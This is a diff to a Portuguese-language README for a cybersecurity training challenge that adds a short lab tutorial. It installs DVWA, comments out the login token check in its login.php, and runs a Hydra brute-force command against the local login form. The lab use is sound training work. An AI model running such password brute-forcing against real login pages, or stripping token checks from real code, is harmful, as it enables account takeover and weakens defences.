@@ -955,9 +955,36 @@ Como profissional de segurança, este projeto:
 
 **Autor:** Thiago Maria   
 **Data:** Outubro de 2025   
-**Desafio:** Santander Cibersegurança 2025 em parceria com a DIO    
+**Desafio:** Santander Cibersegurança 2025 em parceria com a DIO     
+
+---
+
+### Tutorial rápido e secreto:
+
+1. Instale o DVWA  
+```bash
+# Atualização do sistema
+sudo apt update
+
+# Instalação do DVWA
+sudo apt install dvwa
+
+# Inicialização do serviço
+dvwa-start
+```
+2. Entre no login.php do DVWA  
+
+```
+sudo nano /usr/share/dvwa/login.php
+```
+3. Comente com `//` para desativar o checkToken  
+```
+// checkToken( $_REQUEST[ 'user_token' ], $session_token, 'login.php' );
+```
+4. Rode a Hydra
 ```
 hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -s 42001
 ```
+
 *"A segurança não é um produto, mas um processo contínuo de aprendizado e adaptação."*
 
